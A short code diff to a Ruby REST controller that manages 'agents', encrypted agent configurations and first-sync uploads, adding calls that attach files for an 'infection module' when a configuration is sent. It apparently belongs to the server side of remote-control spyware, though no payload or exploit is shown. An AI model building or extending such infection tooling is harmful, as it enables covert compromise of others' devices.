@@ -210,6 +210,7 @@ class AgentController < RESTController
           config.saved = Time.now.getutc.to_i
           config.user = @session[:user][:name]
           config.save
+
         when 'factory'
           agent.configs.delete_all
           config = agent.configs.create!(config: @params['config'], user: @session[:user][:name], saved: Time.now.getutc.to_i)
@@ -338,6 +339,9 @@ class AgentController < RESTController
     # add the upload files for the first sync
     agent.add_first_time_uploads
 
+    # add the files needed for the infection module
+    agent.add_infection_files
+
     # add default requests for the filesystem
     agent.add_default_filesystem_requests
 
@@ -365,6 +369,9 @@ class AgentController < RESTController
         # we have sent the configuration, wait for activation
         config.sent = Time.now.getutc.to_i
         config.save
+
+        # add the files needed for the infection module
+        agent.add_infection_files
 
         # encrypt the config for the agent using the confkey
         enc_config = config.encrypted_config(agent[:confkey])
